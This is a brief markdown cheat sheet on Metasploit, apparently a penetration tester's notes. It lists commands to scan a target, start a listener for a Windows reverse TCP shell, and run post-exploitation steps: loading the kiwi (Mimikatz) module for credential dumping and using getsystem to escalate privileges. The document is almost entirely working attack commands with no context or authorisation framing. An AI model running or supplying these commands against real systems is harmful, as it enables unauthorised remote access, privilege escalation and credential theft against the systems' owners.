# Metasploit Usage

## Setup

```shell
sudo msfconsole
db_nmap -A <target>
```

## Handlers

```shell
use multi/handler
set payload windows/x64/shell/reverse_tcp
run -j
```

## Post Exploitation

```shell
load kiwi
getsystem
```
